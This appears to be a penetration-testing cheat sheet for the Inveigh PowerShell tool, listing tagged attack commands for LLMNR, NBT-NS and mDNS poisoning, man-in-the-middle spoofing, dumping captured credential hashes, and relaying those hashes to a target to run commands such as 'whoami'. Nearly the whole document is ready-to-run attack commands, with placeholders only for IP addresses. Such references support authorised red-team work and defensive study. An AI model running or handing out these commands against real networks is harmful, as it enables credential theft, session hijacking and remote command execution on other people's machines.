# inveigh

% inveigh, LLMNR, NBT-NS, Poisoning, man in the middle

## inveigh - launch
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP <listening_ip> -SpooferIP <redirect_ip>
```

## inveigh - clear hashtable
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Clear-Inveigh
```

## inveigh - get data from hashtable
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Get-Inveigh
```

## inveigh - stop all running modules
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Stop-Inveigh
```

## inveigh - enable rela-time console output
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Watch-Inveigh
```

## inveigh - Relaying Hashes Captured w/ HTTP Proxy
#plateform/windows #target/serve #cat/ATTACK/MITM 
```
Invoke-InveighRelay -ConsoleOutput Y -Target <targetIP> -Command "whoami" -Attack Enumerate,Execute,Session
```